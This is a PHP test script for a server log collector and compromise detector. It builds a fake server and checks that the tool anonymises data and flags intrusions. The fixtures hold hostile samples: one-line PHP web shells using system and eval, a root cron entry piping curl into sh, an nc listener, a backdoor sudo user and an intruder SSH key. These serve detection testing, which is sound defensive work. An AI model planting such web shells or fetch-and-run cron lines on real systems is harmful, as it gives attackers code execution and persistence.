<?php

declare(strict_types=1);

/*
 * Dependency-free tests: php tests/run.php
 *
 * Builds a fake server tree in tests/tmp from tests/fixtures/root (adding the
 * pieces git can't store: release .git folders, the current symlink, a TLS cert),
 * runs the collector against it twice, and checks the output.
 */

require __DIR__ . '/../src/bootstrap.php';

use LogWatch\Anon;
use LogWatch\Sections\AppLogs;
use LogWatch\Sections\Snapshot;

$failures = 0;
$passes = 0;
function check(string $label, bool $ok, mixed $detail = null): void
{
    global $failures, $passes;
    if ($ok) {
        $passes++;
        return;
    }
    $failures++;
    echo "FAIL: $label" . ($detail !== null ? ' — got ' . json_encode($detail, JSON_UNESCAPED_SLASHES) : '') . "\n";
}

// ---------------------------------------------------------------- unit tests

$anon = new Anon(str_repeat('k', 40));
check('tailnet v4', Anon::isTailnet('100.64.0.1') && Anon::isTailnet('100.127.255.255'));
check('not tailnet v4 outside /10', !Anon::isTailnet('100.63.255.255') && !Anon::isTailnet('100.128.0.1'));
check('tailnet v6', Anon::isTailnet('fd7a:115c:a1e0::9039:6411'));
check('not tailnet v6', !Anon::isTailnet('fd7a:115c:a1e1::1'));
check('scope public', Anon::scope('8.8.8.8') === 'public', Anon::scope('8.8.8.8'));
check('scope private', Anon::scope('10.10.5.146') === 'private');
check('scope tailnet beats CGNAT reserved', Anon::scope('100.124.100.16') === 'tailnet');
check('scope loopback', Anon::scope('127.0.0.1') === 'loopback' && Anon::scope('::1') === 'loopback');
check('token stable', $anon->token('8.8.8.8') === $anon->token('8.8.8.8'));
check('token canonicalises v6', $anon->token('2001:DB8:0::1') === $anon->token('2001:db8::1'));
check('token length', strlen($anon->token('8.8.8.8')) === 12);
$s = $anon->scrub("client 203.0.113.5 and 2001:db8::7 mail bob@example.com key sk_fake_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345\x07 /home/forge/site-abc/releases/123/app/X.php");
check('scrub ipv4', !str_contains($s, '203.0.113.5') && str_contains($s, 'ip:'), $s);
check('scrub ipv6', !str_contains($s, '2001:db8::7'), $s);
check('scrub email', !str_contains($s, 'bob@') && str_contains($s, '[email]'), $s);
check('scrub long token', !str_contains($s, 'ABCDEFGHIJ'), $s);
check('scrub control chars', !str_contains($s, "\x07"), $s);
check('scrub shortens release paths', str_contains($s, '<release>/app/X.php'), $s);
check('scrub keeps timestamps', $anon->scrub('at 17:12:01 ok') === 'at 17:12:01 ok');
check('scrub keeps version strings', str_contains($anon->scrub('Chrome/124.0.6367.207'), '124.0.6367.207'));
check('scrub keeps reduced Chrome version that looks like an IP', $anon->scrub('Chrome/131.0.0.0 Safari') === 'Chrome/131.0.0.0 Safari');
check('scrub still tokenises IPs in URLs', !str_contains($anon->scrub('http://203.0.113.5/x'), '203.0.113.5'));
check('scrub keeps paths around hashed filenames', str_contains($anon->scrub('/x/dist/_astro/Layout.abcdefghijklmnopqrstuvwxyz0123456789.js'), '/x/dist/_astro/Layout.'));
check('clean keeps key comments', Anon::clean("worker@forge.laravel.com\x07") === 'worker@forge.laravel.com');
check('scrubPath drops query', $anon->scrubPath('/reset?token=abc&e=x@y.com') === '/reset');
check('scrub truncates', mb_strlen($anon->scrub(str_repeat('a ', 300), 50)) === 50);
check('signature ignores numbers', Anon::signature('timeout after 110 ms') === Anon::signature('timeout after 95 ms'));
check('signature differs on text', Anon::signature('timeout') !== Anon::signature('refused'));

$craft = AppLogs::parse('2026-11-07 19:20:50 [web.ERROR] [yii\web\HttpException:400] Submitted data was tampered. {"trace":[]}');
check('craft parse', $craft !== null && $craft['level'] === 'ERROR' && $craft['class'] === 'yii\web\HttpException:400' && $craft['message'] === 'Submitted data was tampered.', $craft);
$lar = AppLogs::parse('[2026-11-07T09:30:00.123456+00:00] production.ERROR: Boom {"exception":"[object] (App\\\\Exceptions\\\\Foo(code: 0): Boom at /x:1)"}');
check('laravel parse iso ts + class', $lar !== null && $lar['class'] === 'App\\Exceptions\\Foo' && $lar['message'] === 'Boom', $lar);
check('stack trace line is not an entry', AppLogs::parse('#0 /home/forge/x.php(12): foo()') === null);

$fp = Snapshot::fingerprint('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyBlobForTestsOnly0000000000000000000 worker@forge');
check('fingerprint', $fp !== null && str_starts_with($fp['fp'], 'SHA256:') && $fp['comment'] === 'worker@forge', $fp);
check('fingerprint with options', Snapshot::fingerprint('command="x",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyBlobForTestsOnly0000000000000000000 c')['comment'] === 'c');

// ---------------------------------------------------------------- build the fake server

$base = __DIR__;
$tmp = "$base/tmp";
exec('rm -rf ' . escapeshellarg($tmp));
mkdir($tmp, 0700, true);
exec('cp -R ' . escapeshellarg("$base/fixtures/root") . ' ' . escapeshellarg("$tmp/root"));
$root = "$tmp/root";

$mkRelease = function (string $site, string $id, array $files) use ($root): void {
    $rel = "$root/home/forge/$site/releases/$id";
    mkdir("$rel/.git", 0700, true);
    foreach ($files as $f => $body) {
        @mkdir(dirname("$rel/$f"), 0700, true);
        file_put_contents("$rel/$f", $body);
    }
    symlink("releases/$id", "$root/home/forge/$site/current");
};
$mkRelease('example-abc.on-forge.com', '100', [
    'artisan' => '<?php',
    'public/index.php' => '<?php',
    'public/robots.txt' => '',
    'public/shell.php' => '<?php system($_GET["c"]);',
]);
$mkRelease('craftsite-xyz.on-forge.com', '7', ['craft' => '<?php', 'web/index.php' => '<?php']);

// Hostile shapes a compromised site user could plant. None may hang the run.
$rel100 = "$root/home/forge/example-abc.on-forge.com/releases/100";
mkdir("$root/home/forge/example-abc.on-forge.com/storage/app/public", 0700, true);
symlink('../../../storage/app/public', "$rel100/public/storage");          // Laravel's public/storage link
symlink('.', "$rel100/public/loop");                                         // a symlink loop
symlink('/dev/zero', "$root/home/forge/example-abc.on-forge.com/storage/logs/zero.log");
mkdir("$root/home/backdoor/.ssh", 0700, true);
symlink('/dev/zero', "$root/home/backdoor/.ssh/authorized_keys");

// A self-signed cert that expires in 10 days.
$key = openssl_pkey_new(['private_key_type' => OPENSSL_KEYTYPE_EC, 'curve_name' => 'prime256v1']);
$cfgFile = "$tmp/openssl.cnf";
file_put_contents($cfgFile, "[req]\ndistinguished_name=dn\n[dn]\n[ext]\nsubjectAltName=DNS:example.com,DNS:www.example.com\n");
$csr = openssl_csr_new(['commonName' => 'example.com'], $key, ['config' => $cfgFile, 'digest_alg' => 'sha256']);
$cert = openssl_csr_sign($csr, null, $key, 10, ['config' => $cfgFile, 'x509_extensions' => 'ext', 'digest_alg' => 'sha256']);
@mkdir("$root/etc/nginx/ssl/example.com", 0700, true);
openssl_x509_export_to_file($cert, "$root/etc/nginx/ssl/example.com/server.crt");

$runCollector = function (string $date) use ($base, $root, $tmp): array {
    $cmd = sprintf(
        'php %s --root=%s --state-dir=%s --secret-file=%s --date=%s --server=test 2>&1',
        escapeshellarg("$base/../bin/logwatch-collect"),
        escapeshellarg($root),
        escapeshellarg("$tmp/state"),
        escapeshellarg("$base/fixtures/secret"),
        $date
    );
    exec($cmd, $lines, $code);
    $raw = implode("\n", $lines);
    $json = json_decode($raw, true);
    if ($code !== 0 || !is_array($json)) {
        echo "Collector failed (exit $code):\n$raw\n";
        exit(1);
    }
    return [$json, $raw];
};

// ---------------------------------------------------------------- run 1: baseline day

[$o, $raw] = $runCollector('2026-11-07');

// Privacy: no fixture IP, email or secret may appear anywhere in the output.
$secrets = ['203.0.113.', '198.51.100.', '192.0.2.', '100.101.102.103', '2001:db8', 'jane@', 'bob@', 'carol@', 'admin@example.org',
    'SECRETVALUE', 'sk_fake_', '#0 ', '[stacktrace]', 'system($_GET'];
foreach ($secrets as $needle) {
    check("output never contains '$needle'", !str_contains($raw, $needle));
}
check('no section errors', $o['collector']['errors'] === [], $o['collector']['errors']);
check('schema/meta', $o['schema'] === 1 && $o['server'] === 'test' && $o['date'] === '2026-11-07');
check('output is small', strlen($raw) < 40000, strlen($raw));

// Sites
$names = array_column($o['sites'], 'name');
check('sites discovered by friendly name', $names === ['example.com', 'craft.example.net'], $names);

// auth
$ssh = $o['auth']['ssh'];
check('two logins in window', count($ssh['logins']) === 2, $ssh['logins']);
check('one login from outside tailnet', $ssh['logins_from_outside_tailnet'] === 1);
$scopes = array_column(array_column($ssh['logins'], 'source'), 'scope');
sort($scopes);
check('login scopes', $scopes === ['public', 'tailnet'], $scopes);
$comments = array_column($ssh['logins'], 'key_comment', 'user');
check('login labelled with key comment', ($comments['root'] ?? null) === 'worker@forge', $comments);
check('unknown key labelled', ($comments['forge'] ?? null) === '(not in any authorized_keys)', $comments);
check('invalid users incl. classic-format file', $ssh['failed']['invalid_user'] === 4, $ssh['failed']);
check('preauth disconnects', $ssh['failed']['preauth_disconnect'] === 1);
check('failed password (ipv6)', $ssh['failed']['bad_auth'] === 1);
check('top username admin x2', $ssh['failed']['top_usernames'][0] === ['user' => 'admin', 'count' => 2], $ssh['failed']['top_usernames']);
check('top source is tokenised', preg_match('/^[0-9a-f]{12}$/', $ssh['failed']['top_sources'][0]['ip']) === 1);
check('sudo commands', count($o['auth']['sudo']['commands']) === 1 && $o['auth']['sudo']['commands'][0]['count'] === 2, $o['auth']['sudo']);
check('sudo auth failure', ($o['auth']['sudo']['auth_failures']['forge'] ?? 0) === 1, $o['auth']['sudo']);
check('new user', $o['auth']['accounts']['users_added'] === ['backdoor'], $o['auth']['accounts']);
check('group membership', $o['auth']['accounts']['group_membership'] === ['backdoor +sudo'], $o['auth']['accounts']);

// fail2ban / firewall
check('fail2ban bans', $o['fail2ban']['bans_by_jail'] === ['sshd' => 2] && $o['fail2ban']['unique_banned'] === 2, $o['fail2ban']);
check('ufw blocks', $o['firewall']['blocked_total'] === 3 && $o['firewall']['top_ports'][0] === ['port' => 'tcp/3389', 'count' => 2], $o['firewall']);

// system
$j = $o['system']['journal'];
check('journal skips UFW lines', $j['firewall_lines_skipped'] === 2, $j);
check('oom kill', $j['oom_kills'] === ['php-fpm8.4' => 1], $j['oom_kills']);
check('redis messages grouped', $j['top_messages'][0]['count'] === 2, $j['top_messages']);
check('byte-array message handled', ($j['by_priority']['crit'] ?? 0) === 1, $j['by_priority']);
check('unit failure', $o['system']['units']['failures'] === ['horizon.service' => ['exit-code' => 1]], $o['system']['units']);
check('restart loop', $o['system']['units']['restart_loops'] === ['horizon.service' => 5]);
check('failed now', $o['system']['units']['failed_now'] === ['horizon.service'], $o['system']['units']['failed_now']);
check('upgrades', $o['system']['unattended_upgrades']['packages_upgraded'] === 2 && count($o['system']['unattended_upgrades']['errors']) === 1, $o['system']['unattended_upgrades']);
check('disk', $o['system']['disk'][0]['mount'] === '/' && $o['system']['disk'][0]['used_pct'] === 84 && $o['system']['disk'][0]['inodes_used_pct'] === 10, $o['system']['disk']);

// nginx
$a = $o['nginx']['shared_access_log'];
check('access requests in window', $a['requests'] === 137, $a['requests']);
check('malformed request', $a['malformed_requests'] === 1);
check('scanner patterns', $a['scanner_patterns'] === ['cgi' => 1, 'env' => 1, 'git' => 1, 'wp-login' => 1], $a['scanner_patterns']);
check('burst detected', count($a['bursts']) === 1 && $a['bursts'][0]['peak_per_minute'] === 130, $a['bursts']);
check('query string dropped from paths', in_array('/reset', array_column($a['top_paths'], 'path'), true));
check('new paths on baseline', $a['new_paths']['new_total'] === count($a['top_paths']) && $a['new_paths']['baseline_days'] === 0, $a['new_paths']);
$e = $o['nginx']['site_errors']['example.com'] ?? null;
check('site error log found', $e !== null);
check('probe scripts', $e['probe_scripts'] === [['script' => 'y.php', 'count' => 1], ['script' => 'zero.php', 'count' => 1]], $e['probe_scripts']);
check('upstream timeouts grouped', $e['by_type']['upstream_timeout'] === 2 && $e['top_messages'][0]['count'] === 2, $e);
check('php fatal classified', $e['by_type']['php_fatal'] === 1);

// apps
$lv = $o['apps']['sites']['example.com'] ?? null;
check('laravel levels', $lv['framework'] === 'laravel' && $lv['by_level'] === ['CRITICAL' => 1, 'DEBUG' => 1, 'ERROR' => 2, 'INFO' => 1, 'WARNING' => 1], $lv['by_level'] ?? null);
check('laravel errors grouped by class', str_contains($lv['top_errors'][0]['sample'], 'Illuminate\\Database\\QueryException') && $lv['top_errors'][0]['count'] === 2, $lv['top_errors']);
$cr = $o['apps']['sites']['craft.example.net'] ?? null;
check('craft levels', $cr['framework'] === 'craft' && $cr['by_level'] === ['ERROR' => 1, 'INFO' => 1, 'WARNING' => 1], $cr);

// state snapshot
$st = $o['state'];
check('baseline run', $st['baseline'] === true);
check('ports parsed', in_array('tcp/443 tailnet tailscaled', $st['ports']['listening'], true) && in_array('udp/53 loopback systemd-resolve', $st['ports']['listening'], true), $st['ports']['listening']);
check('sudo members', $st['access_control']['sudo_group_members'] === ['forge (sudo)'], $st['access_control']);
check('webroot untracked php', ($st['webroots']['findings']['example.com']['untracked_executable'] ?? null) === ['public/shell.php'], $st['webroots']);
check('webroot modified tracked, storage/ ignored', ($st['webroots']['findings']['craft.example.net']['modified_tracked'] ?? null) === ['M config/app.php'], $st['webroots']);
check('ufw rules', $st['firewall_rules']['status'] === 'active' && count($st['firewall_rules']['rules']) === 5 && $st['firewall_rules']['rules'][0] === '22 | ALLOW | Anywhere', $st['firewall_rules']);
check('processes top is miner', $st['processes']['top_cpu'][0]['command'] === 'xmrig', $st['processes']['top_cpu'][0]);
check('php-fpm aggregated', in_array(['user' => 'www-data', 'command' => 'php-fpm8.4', 'cpu_seconds' => 8000, 'processes' => 2], $st['processes']['top_cpu'], true));
check('patching', $st['patching']['security_updates'] === 3 && $st['patching']['reboot_required'] === true, $st['patching']);
check('tls expiring', count($st['tls']['expiring_soon']) === 1 && $st['tls']['expiring_soon'][0]['names'] === ['example.com', 'www.example.com'], $st['tls']);

check('authorized_keys symlink to /dev/zero is not read', ($o['collector']['seconds'] < 30) && $st['access_control']['authorized_keys'] === 1, $st['access_control']);
check('log symlink to /dev/zero is skipped', !isset($o['apps']['sites']['example.com']['by_channel']['zero']), $o['apps']['sites']['example.com']['by_channel'] ?? null);
check('state written', is_file("$tmp/state/snapshot.json") && is_file("$tmp/state/seen.json") && is_file("$tmp/state/ipmap/2026-11-07.json"));
$map = json_decode((string) file_get_contents("$tmp/state/ipmap/2026-11-07.json"), true);
check('ip map resolves tokens locally', in_array('203.0.113.9', $map, true));
check('state files are private', (fileperms("$tmp/state/snapshot.json") & 0077) === 0);

// ---------------------------------------------------------------- run 2: something changes

file_put_contents("$root/_commands/ss.txt", "tcp   LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:((\"nc\",pid=6666,fd=3))\n", FILE_APPEND);
file_put_contents("$root/home/forge/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAnotherFakeKeyForTestsOnly000000000000000000 intruder@laptop\n", FILE_APPEND);
file_put_contents("$root/home/forge/example-abc.on-forge.com/releases/100/public/new.php", '<?php');
file_put_contents("$root/home/forge/example-abc.on-forge.com/releases/100/public/index.php", '<?php eval($_POST["x"]);');
file_put_contents("$root/home/forge/example-abc.on-forge.com/storage/app/public/up.php", '<?php');
// The attacker commits new.php, so git now calls it tracked; our hashes still see it.
file_put_contents("$root/_commands/git-ls-files-1001.txt", "public/index.php\npublic/robots.txt\npublic/new.php\n");
file_put_contents("$root/_commands/git-head-1001.txt", "9999999999999999\n");
file_put_contents("$root/etc/cron.d/evil", "* * * * * root curl x | sh\n");
file_put_contents("$root/_commands/ufw-status.txt", "6379                       ALLOW       Anywhere\n", FILE_APPEND);
file_put_contents("$root/etc/passwd", "backdoor:x:1001:1001::/home/backdoor:/bin/bash\n", FILE_APPEND);

[$o2] = $runCollector('2026-11-08');
$st2 = $o2['state'];
check('run 2 not baseline', $st2['baseline'] === false && $st2['previous_date'] === '2026-11-07');
check('new port', $st2['ports']['added'] === ['tcp/4444 all nc'], $st2['ports']);
check('key added', count($st2['access_control']['keys_added']) === 1 && $st2['access_control']['keys_added'][0]['comment'] === 'intruder@laptop', $st2['access_control']);
check('authorized_keys file changed', in_array('/home/forge/.ssh/authorized_keys', $st2['access_control']['changed_files'], true), $st2['access_control']);
check('user added', $st2['access_control']['users_added'] === ['backdoor'], $st2['access_control']);
check('cron added', $st2['scheduled']['cron_added'] === ['/etc/cron.d/evil'], $st2['scheduled']);
$wr2 = $st2['webroots']['findings']['example.com'] ?? [];
check('new php within same release, by our own hashes', ($wr2['new_executable'] ?? null) === ['public/new.php', 'public/storage/up.php'], $wr2);
check('edited tracked php caught by hash', ($wr2['changed_executable'] ?? null) === ['public/index.php'], $wr2);
check('HEAD moving within a release is flagged', ($wr2['head_moved_within_release'] ?? null) === true, $wr2);
check('symlink loop does not truncate or hang', !isset($wr2['scan_truncated']), $wr2);
check('known untracked shown as a count after first look', ($st2['webroots']['findings']['example.com']['untracked_count'] ?? null) === 2 && !isset($st2['webroots']['findings']['example.com']['untracked_executable']), $st2['webroots']);
check('ufw rule added', $st2['firewall_rules']['added'] === ['6379 | ALLOW | Anywhere'], $st2['firewall_rules']);
check('cpu delta since last run', $st2['processes']['since_previous_run'] === true && $st2['processes']['top_cpu'][0]['cpu_seconds'] === 0, $st2['processes']['top_cpu'][0]);
check('seen paths not new again', $o2['nginx']['shared_access_log']['new_paths']['new_total'] === 0, $o2['nginx']['shared_access_log']['new_paths']);

echo "\n$passes passed, $failures failed\n";
exit($failures > 0 ? 1 : 0);
